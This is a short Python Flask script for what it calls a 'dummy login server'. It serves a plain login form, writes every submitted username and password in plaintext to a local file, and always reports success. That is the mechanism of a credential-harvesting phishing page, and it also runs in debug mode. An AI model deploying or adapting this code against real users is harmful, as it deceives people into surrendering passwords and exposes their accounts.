from flask import Flask, render_template_string, request
import os

app = Flask(__name__)

LOGIN_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Login Page</title>
</head>
<body>
    <h2>Login</h2>
    <form method="POST" action="/login">
        <label for="username">Username:</label><br>
        <input type="text" id="username" name="username" required><br><br>
        <label for="password">Password:</label><br>
        <input type="password" id="password" name="password" required><br><br>
        <button type="submit">Login</button>
    </form>
</body>
</html>
"""

CREDENTIALS_FILE = "credentials.txt"

@app.route('/')
def home():
    return render_template_string(LOGIN_PAGE)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    # Write credentials to file
    with open(CREDENTIALS_FILE, 'a') as f:
        f.write(f"Username: {username}, Password: {password}\n")
    
    return "<h2>Login successful!</h2>"

if __name__ == '__main__':
    # Remove existing credentials file if it exists
    if os.path.exists(CREDENTIALS_FILE):
        os.remove(CREDENTIALS_FILE)
    
    print("Starting the dummy login server. Open http://127.0.0.1:5000 in your browser.")
    app.run(debug=True)
